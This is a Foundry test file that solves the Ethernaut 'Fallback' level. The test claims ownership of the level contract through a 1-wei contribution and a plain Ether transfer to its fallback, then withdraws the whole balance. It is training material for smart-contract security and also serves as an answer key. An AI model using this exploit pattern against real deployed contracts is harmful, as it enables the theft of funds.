// // SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/levels/01-Fallback/FallbackFactory.sol";
import "../src/core/Ethernaut.sol";

contract FallbackTest is Test {
    // Vm vm = Vm(address(HEVM_ADDRESS));
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        // Sets an address' balance, (who, newBalance)
        vm.deal(attacker, 1 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackContract = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Contribute one time to satisfy ownership change condition
        fallbackContract.contribute{value: 1 wei}();

        emit log_named_uint(
            "Verify contribution state change: ",
            fallbackContract.getContribution()
        );

        // Send Ether to the contract which triggers the `fallback()` function
        payable(address(fallbackContract)).call{value: 1 wei}("");
        assertEq(fallbackContract.owner(), attacker);

        emit log_named_address(
            "owner of the attacked contract(before hacking): ",
            fallbackContract.owner()
        );

        emit log_named_uint(
            "Contract balance (before): ",
            address(fallbackContract).balance
        );

        emit log_named_uint("Attacker balance (before): ", attacker.balance);

        fallbackContract.withdraw(); // Empty smart contract funds
        assertEq(address(fallbackContract).balance, 0);

        emit log_named_uint(
            "Contract balance (after): ",
            address(fallbackContract).balance
        );

        emit log_named_uint("Attacker balance (after): ", attacker.balance);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
